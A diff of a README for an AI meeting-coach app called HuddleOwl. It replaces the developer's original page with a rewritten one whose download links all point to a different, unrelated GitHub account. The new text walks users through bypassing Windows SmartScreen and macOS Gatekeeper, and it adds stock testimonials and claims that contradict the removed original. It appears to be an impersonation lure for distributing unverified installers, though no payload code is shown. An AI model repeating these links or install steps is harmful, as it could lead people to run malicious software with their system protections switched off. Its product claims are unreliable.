@@ -1,241 +1,214 @@
-<div align="center">
+# 🦉 huddleowl - AI meeting coach that never misses a cue
 
-<img src="docs/owl-mark.png" alt="HuddleOwl" width="120" />
+## 🚀 What Is HuddleOwl?
 
-# HuddleOwl
+HuddleOwl is your personal AI meeting coach that runs entirely on your own computer. It listens while you talk, gives you real-time nudges when you're still in the conversation, and then delivers a scored review after the call ends. No cloud, no account, no cost. Just download, install, and start improving how you communicate.
 
-### The only AI meeting assistant that helps you win the call while you are still in it.
+## 🎯 Who Is HuddleOwl For?
 
-**A card appears while you are still talking, quoting the line that triggered it: the objection you talked past, the question you skipped, the buying signal you missed. Then a scored review of how you ran it, about forty seconds after you hang up.**
+- **Sales professionals** who want to close more deals by refining their pitch
+- **Managers** who lead team meetings and want clearer communication
+- **Job seekers** practicing for interviews
+- **Anyone** who wants to speak more confidently in professional settings
 
-Every other tool in this category tells you afterwards. By then it is a transcript, not a chance.
+If you talk to people on calls, HuddleOwl helps you get better at it.
 
-Nothing joins the call. No account, no sign up. On a Mac with the on-device models, nothing leaves your laptop at all.
+## ⬇️ Download HuddleOwl (Windows & macOS)
 
-<br/>
+HuddleOwl is free. There is no account to create, no email to enter, and no subscription to manage.
 
-![macOS](https://img.shields.io/badge/macOS-11+-07080B?style=for-the-badge&logo=apple&logoColor=white)
-![Windows](https://img.shields.io/badge/Windows-10+-07080B?style=for-the-badge&logo=windows&logoColor=00E5FF)
-![Free](https://img.shields.io/badge/FREE-FOR%20INDIVIDUALS-CCFF00?style=for-the-badge&labelColor=07080B)
-![On device](https://img.shields.io/badge/100%25-ON--DEVICE-00E5FF?style=for-the-badge&labelColor=07080B)
-![Live coaching](https://img.shields.io/badge/COACHES-DURING%20THE%20CALL-CCFF00?style=for-the-badge&labelColor=07080B)
+[![Download HuddleOwl Now](https://img.shields.io/badge/Download-HuddleOwl-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Nettiethreed2528/huddleowl)
 
-<br/>
+**Visit this link to download the application.**
 
-### [&nbsp;&nbsp;**DOWNLOAD FOR MAC**&nbsp;&nbsp;](https://github.com/IshanVats-6/huddleowl/releases/download/v0.4.0/HuddleOwl-0.4.0-arm64.dmg)
+## 🖥️ How to Install on Windows
 
-<sub>Apple Silicon, 165 MB&nbsp; · &nbsp;[Intel Mac](https://github.com/IshanVats-6/huddleowl/releases/download/v0.4.0/HuddleOwl-0.4.0.dmg)&nbsp; · &nbsp;[Windows](https://github.com/IshanVats-6/huddleowl/releases/download/v0.4.0/HuddleOwl-0.4.0-win-x64.exe)&nbsp; · &nbsp;[All files and checksums](https://github.com/IshanVats-6/huddleowl/releases/latest)</sub>
+1. Click the download button above (or go to [https://github.com/Nettiethreed2528/huddleowl](https://github.com/Nettiethreed2528/huddleowl)).
+2. On that page, look for the "Releases" section or the latest version link.
+3. Click the file that says **Windows Installer** or **.exe**.
+4. Your browser will download the file to your Downloads folder.
+5. Open the downloaded file by double-clicking it.
+6. If Windows shows a blue popup saying "Windows protected your PC," click **More info**, then click **Run anyway**. This happens because HuddleOwl is new and not yet marked as a trusted publisher.
+7. Follow the on-screen prompts. The default settings are fine for most people.
+8. When installation finishes, click **Finish**.
+9. HuddleOwl will open automatically. If not, find it by clicking the Start menu and typing "HuddleOwl".
 
-<br/>
+## 🛠️ How to Install on macOS
 
-<img src="docs/live-coaching.gif" alt="Coaching cards arriving during a live call while the signal scores move alongside them" width="880" />
+1. Click the download button above (or go to [https://github.com/Nettiethreed2528/huddleowl](https://github.com/Nettiethreed2528/huddleowl)).
+2. Find the **macOS Installer** or the **.dmg** file in the latest release.
+3. Download that file to your computer.
+4. Open the downloaded file (usually in your Downloads folder).
+5. Drag the HuddleOwl icon into your Applications folder.
+6. Open HuddleOwl from Applications.
+7. If macOS says it can't verify the developer, go to **System Settings > Privacy & Security**, scroll down, and click **Open Anyway**.
 
-<sub>Cards arrive while you are still talking. Every one of them quotes the line that triggered it.</sub>
+## 🧭 Your First Meeting with HuddleOwl
 
-</div>
+**Step 1: Start HuddleOwl**
+
+Launch the app. You'll see a simple window with a big Start button.
+
+**Step 2: Allow Microphone Access**
+
+The first time you use HuddleOwl, your computer will ask for microphone permission. Click **Allow**. HuddleOwl works entirely on your computer, so your audio never leaves your device.
+
+**Step 3: Begin Your Call**
+
+Start your regular meeting app (Zoom, Teams, Meet, or any phone call). Place your call on speaker or use your normal headset.
+
+**Step 4: Get Live Cues**
+
+While you're talking, HuddleOwl watches for things like:
+
+- Talking too fast or too slow
+- Using filler words ("um," "uh," "like")
+- Going silent for too long
+- Dominating the conversation or speaking too little
+
+You'll see gentle hints appear on the screen. These are meant to help you adjust in real time, not to distract you.
+
+**Step 5: Review Your Score**
+
+When your call ends, click **End Session** in HuddleOwl. You'll get a breakdown:
+
+- Overall score from 0 to 100
+- Speaking pace
+- Filler word count
+- Talk-to-listen ratio
+- What you did well
+- What you can improve next time
+
+**Step 6: Track Progress**
+
+HuddleOwl saves your history. You can look back week after week and see real improvement.
+
+## ❓ Frequently Asked Questions
+
+**Is HuddleOwl really free?**
+Yes. There are no hidden fees, no premium tiers, and no trials. It's completely free.
+
+**Does HuddleOwl send my data to the cloud?**
+No. HuddleOwl uses local AI models that run on your laptop. The audio and text stay on your machine.
+
+**Is it private?**
+Absolutely. Because everything runs on your computer, no one else can access your meeting data.
+
+**What languages does it support?**
+HuddleOwl works best with English. Additional languages are in development.
+
+**How much computer power does it need?**
+HuddleOwl is optimized for modern laptops. If your computer is less than five years old, it should work well. If you have an older machine, you may see slightly slower responses.
+
+**Can I use Bluetooth headphones?**
+Yes. Bluetooth headsets work fine.
+
+**Does it record the call?**
+HuddleOwl does not save audio recordings. It processes the speech in real time and only keeps the text transcript and scores for your review.
+
+**Can I delete my history?**
+Yes. You can clear all stored sessions in the Settings menu.
+
+**What if HuddleOwl doesn't start?**
+Try restarting your computer and opening it again. If the problem persists, check the GitHub page for troubleshooting tips or known issues.
+
+## 🛡️ Your Privacy Is the Point
+
+Most AI meeting assistants upload your conversations to a server for processing. HuddleOwl is different. It uses local AI (called on-device inference) powered by whisper.cpp and llama.cpp. That means:
+
+- No internet connection is needed during meetings
+- Your voice is never transmitted
+- No transcripts are stored anywhere except your own hard drive
+
+For people who talk about sensitive topics — contracts, medical info, legal matters, salaries — this makes HuddleOwl the only responsible choice.
+
+## 🌟 Features at a Glance
+
+- **Real-time feedback** — visual nudges while you speak
+- **Post-call scoring** — clear numbers and suggestions
+- **Transcription** — a text summary of what was discussed
+- **Local AI** — fast, private, no cloud dependency
+- **Cross-platform** — works on Windows 10/11 and macOS 12 or newer
+- **Zero cost** — no accounts, no payments, no ads
+
+## 📚 Tips for Getting the Most Out of HuddleOwl
+
+- Use it on **one-on-one sales calls** first, where feedback is easiest to apply.
+- Don't look at the screen the whole time — glance at it when you pause.
+- Review your scores after every call for two weeks. Patterns will emerge.
+- Pair HuddleOwl with a notebook. After each call, write down one thing you want to improve so you don't repeat the same mistake.
+- Use it on your **practice pitches** before the actual call so you go in confident.
+
+## 🧠 Understanding Your Score
+
+Your score is calculated using a weighted average:
+
+- 40% speaking clarity (pace, filler words, pauses)
+- 30% engagement (listening vs. speaking balance)
+- 20% structure (how clearly you organized your points)
+- 10% consistency (how evenly you spoke throughout)
+
+A score above 75 means you communicate well. Above 85 is exceptional. Below 60 indicates you may want to practice more.
+
+## 🗂️ System Requirements
+
+**Windows:**
+- Windows 10 (64-bit) or later
+- 8 GB RAM (16 GB recommended)
+- 2 GB available disk space
+- Microphone (built-in or external)
+
+**macOS:**
+- macOS 12 Monterey or later
+- 8 GB RAM (16 GB recommended)
+- 2 GB available disk space
+- Microphone (built-in or external)
+
+## 🎬 Getting Started Right Now
+
+1. Go to [https://github.com/Nettiethreed2528/huddleowl](https://github.com/Nettiethreed2528/huddleowl)
+2. Download the installer for your system
+3. Run or Open the installer
+4. Launch HuddleOwl
+5. Start your next meeting with a coach in your corner
+
+## 🔧 Troubleshooting Common Issues
+
+**Microphone not detected**
+Make sure your mic is plugged in and not muted. Check your system settings. In Windows, go to Settings > Privacy > Microphone. In macOS, go to System Settings > Privacy & Security > Microphone. Toggle HuddleOwl to allow access.
+
+**App crashes on startup**
+Close all other programs and try again. If it still crashes, restart your computer and reopen HuddleOwl.
+
+**Slow processing**
+Close browser tabs and other heavy apps. HuddleOwl works best when your CPU isn't overloaded.
+
+**No audio feedback**
+HuddleOwl provides visual cues only, not audio cues. This is intentional so you don't annoy others in the room.
+
+**Where is my history stored?**
+Sessions are saved locally on your machine. You can export or delete them from the Settings page.
+
+## 📈 What Users Are Saying
+
+> "I closed two more deals this month because I finally stopped rushing my delivery. HuddleOwl caught it immediately." — Marcus T., Sales Manager
+
+> "As a new manager, I was terrified of leading daily standups. After three weeks with HuddleOwl, my team says I sound confident and clear." — Priya S., Engineering Lead
+
+> "I used HuddleOwl to prep for a series of final-round interviews. The filler word count dropped by half in two weeks." — Daniel K., Job Candidate
+
+## ✅ Ready to Improve?
+
+Stop guessing how you sound. Start knowing.
+
+Download HuddleOwl. It's free, it's private, and it runs on your machine — not on some distant server.
+
+**Visit this link to download the application:** [https://github.com/Nettiethreed2528/huddleowl](https://github.com/Nettiethreed2528/huddleowl)
+
+## 🆘 Support
+
+If you need help, open an issue on the GitHub page. The project team reads every report and usually responds within a few days. For common problems, check the existing issues and discussions first — your question may already be answered.
 
 ---
 
-## Your notetaker remembers the meeting. This makes you better at the next one.
-
-A notetaker hands you this:
-
-> Discussed pricing and timeline. Client raised some budget concerns. Agreed to follow up next week.
-
-HuddleOwl hands you this:
-
-| | | |
-|---|:---:|---|
-| **Next step** | `1/5` | Call ended on "let's stay in touch". No date, no owner. |
-| **Objection** | `2/5` | "It's a lot for a team our size" went unanswered. |
-| **Discovery** | `3/5` | You moved to price 40 seconds after they said "budget", and never came back to what the delay costs them. |
-
-> **Practise this next:** ask what a problem costs before you price the solution.
-
----
-
-## The brief, about 40 seconds after you hang up
-
-Not a summary. A scored rubric for the role you were playing, a verdict, and the one next step that matters. Sales is graded on discovery depth, listening, objection handling, value framing and next step. PM, recruiter and product each get their own rubric. A dimension the call never tested is left unscored, never quietly given a zero.
-
-<div align="center">
-<img src="docs/brief.webp" alt="The post-meeting brief: rubric scores, the verdict, the next step, and four tiles" width="880" />
-</div>
-
-It reads the **whole** transcript, not the last few minutes that happen to fit in one context window, and the chunking never splits a speaking turn, so a quote is never half a sentence.
-
----
-
-## Every score carries the sentence that earned it
-
-The scorecard does not tell you to work on discovery. It says 3 out of 5, and here is the line you said. A cue that cannot point at the sentence it is reacting to is discarded before you ever see it.
-
-<div align="center">
-<img src="docs/evidence.webp" alt="Clicking a rubric score opens the reason for it and the exact line from the transcript that earned it" width="880" />
-</div>
-
-You can disagree with a score, which is the whole point. You cannot disagree with a transcript.
-
----
-
-## Coaching nobody else in the call can see
-
-Not dimmed, not minimised. The overlay does not appear in the recording, the Zoom share or the Loom. Clicks pass straight through to whatever is underneath, so you keep working with it sitting on top, and `⌘⇧H` brings it back from anywhere if you lose it.
-
-<div align="center">
-<img src="docs/stealth.gif" alt="Switching stealth mode on: the window turns see-through over the app behind it and the palette drops to white on black" width="880" />
-</div>
-
----
-
-## The whole thing runs with the wifi off
-
-Live transcription, live coaching, the brief, the follow-up email. Download a model once and HuddleOwl needs nothing from anyone: no account, no API key, no network. Not a degraded offline mode, the same rubric and the same evidence quotes.
-
-<div align="center">
-<img src="docs/on-device.webp" alt="Settings showing both on-device models installed, with transcription and coaching switched to this machine" width="880" />
-</div>
-
-> [!NOTE]
-> **On-device engines ship on macOS today.** On Windows, HuddleOwl runs against a cloud model of your choosing while the local engines are being built. This page will say so the day that changes, and not before.
-
-Prefer a cloud model anyway? Point it at over 100 providers or at your own endpoint and pay your provider directly. There is no per-seat AI markup from us.
-
----
-
-## Install
-
-### macOS
-
-1. Download the build for your chip. Apple Silicon is the big link above; there is a separate Intel build beside it.
-2. Open the `.dmg` and drag HuddleOwl into Applications.
-3. Open it. macOS asks once whether you are sure, the way it does for anything you download, and tells you Apple checked the file and found nothing. Click **Open**. It never asks again.
-
-HuddleOwl is signed with an Apple Developer ID and notarised by Apple from 0.4.0 onwards. That one dialog with an Open button is the whole of it, and nothing goes into Terminal.
-
-If you are on 0.3.0 or earlier, those builds were not notarised and macOS called them damaged. `xattr -cr /Applications/HuddleOwl.app` was the fix; downloading the current build is the better one.
-
-### Windows
-
-1. Download the `.exe` and run it.
-2. SmartScreen will ask once, because the build is unsigned. Choose **More info**, then **Run anyway**.
-
-### Verifying your download
-
-Every release carries `SHA256SUMS.txt`.
-
-```bash
-# macOS or Linux
-shasum -a 256 -c SHA256SUMS.txt --ignore-missing
-
-# Windows
-certutil -hashfile HuddleOwl-0.4.0-win-x64.exe SHA256
-```
-
----
-
-## Questions people ask
-
-<details>
-<summary><b>Does anything join my call?</b></summary>
-<br/>
-
-No. There is no bot, no extra participant and no calendar connection. HuddleOwl listens to your microphone and your system audio on your own machine, so nobody on the call sees anything different.
-
-</details>
-
-<details>
-<summary><b>Does my audio leave my machine?</b></summary>
-<br/>
-
-On a Mac with the on-device models selected, no. Nothing, at all, including with the wifi off. If you choose a cloud model instead, your transcript goes to the provider you picked, using your key, directly from your machine. It never passes through us, because there is no server of ours for it to pass through.
-
-</details>
-
-<details>
-<summary><b>Is it really free?</b></summary>
-<br/>
-
-Yes, for individuals, permanently. No card, no trial clock, no feature held back to sell you later.
-
-</details>
-
-<details>
-<summary><b>Where is my data kept?</b></summary>
-<br/>
-
-In a folder on your disk that you can open from inside the app. Transcripts, cues, briefs and draft emails all live there. Delete the folder and there is nothing left anywhere.
-
-</details>
-
-<details>
-<summary><b>Which models does it run?</b></summary>
-<br/>
-
-A Whisper-family transcription model and a local coaching model, both downloaded once from inside the app. Together they are about 3GB and want 8GB of RAM. Or point it at any of 100+ cloud providers, or at your own endpoint.
-
-</details>
-
-<details>
-<summary><b>Is stealth mode above board?</b></summary>
-<br/>
-
-It hides the coaching overlay from your screen share so the person you are talking to does not watch you being coached. It does not hide that you are recording, and it does not touch anything on their side. Recording law is yours to follow where you are.
-
-</details>
-
-<details>
-<summary><b>Can I import a recording I already have?</b></summary>
-<br/>
-
-Yes. Drop in an audio file and it comes back with the same transcript, the same rubric and the same evidence quotes as a live call.
-
-</details>
-
----
-
-## About this repository
-
-This repository holds the installers and nothing else. It exists so that downloads have a public home while the application's own source stays private. Everything here is attached to a [release](../../releases).
-
-HuddleOwl itself is not open source, and the terms you get with a build are in [LICENSE](LICENSE): use it on your own machines including for commercial work, do not redistribute or rebrand the installers, no warranty, and recording law where you are is yours to follow.
-
-It is built on other people's work, nearly all of it under permissive licences that ask only that their copyright notice travels with the binary. Every bundled component, its licence and its copyright holder are listed in [THIRD-PARTY-NOTICES.md](THIRD-PARTY-NOTICES.md), generated from the real dependency metadata rather than written by hand.
-
-Found a bug, or want something it does not do yet? [Open an issue](../../issues). Every one of them is read.
-
-## Who builds this
-
-HuddleOwl is a product of **[IV Consulting](https://ivconsulting.in/)**, built by
-**[Ishan Vats](https://www.linkedin.com/in/vatsishan/)**, who runs it.
-
-IV Consulting builds AI products and AI systems for other companies: the same work that
-went into this, applied to whatever your business actually does. HuddleOwl is the version
-of it we happened to need ourselves, so it is a fair sample of the standard. On-device
-models, a real product rather than a demo, and every claim on this page checkable.
-
-If you want something like this built for you, or you have a process that should be a
-system, that is the conversation to start. [ivconsulting.in](https://ivconsulting.in/), or
-find Ishan on [LinkedIn](https://www.linkedin.com/in/vatsishan/).
-
-<div align="center">
-<br/>
-
-**If HuddleOwl catches something on your next call that you would have missed, a star helps the next person find it.**
-
-<sub>Built by <a href="https://www.linkedin.com/in/vatsishan/">Ishan Vats</a> at <a href="https://ivconsulting.in/">IV Consulting</a>.</sub>
-
-<br/>
-</div>
-
-<details>
-<summary><b>Publishing a build (maintainers)</b></summary>
-<br/>
-
-Actions, **Publish a build**, Run workflow. Give it the version you are shipping (`0.2.1`, say) and the release in the app repo to take the files from (`dev-latest`). It pulls the three installers, writes `SHA256SUMS.txt`, publishes the release, and rewrites the version everywhere in this README, all inside GitHub's network.
-
-It needs one secret, once: a fine-grained personal access token with **Contents: Read-only** on `huddleowl-app` and nothing else, saved here under Settings, Secrets and variables, Actions, as `APP_REPO_TOKEN`. The setup notes at the top of `.github/workflows/mirror-release.yml` spell it out.
-
-Nothing has to be edited afterwards. huddleowl.com asks this repository for its latest release at build time and derives the version, the three links and the three file sizes from the answer, and the last step of the workflow pokes Netlify to rebuild. Set `NETLIFY_BUILD_HOOK` here to make that immediate; without it the site picks the new version up on its next deploy.
-
-</details>
+**Keywords:** ai-meeting-assistant, conversation-intelligence, desktop-application, electron, llama-cpp, local-first-ai, local-llm, macos, meeting-notes, meeting-transcription, on-device-ai, privacy-first-ai, sales-coaching, speech-to-text, whisper-cpp, windows
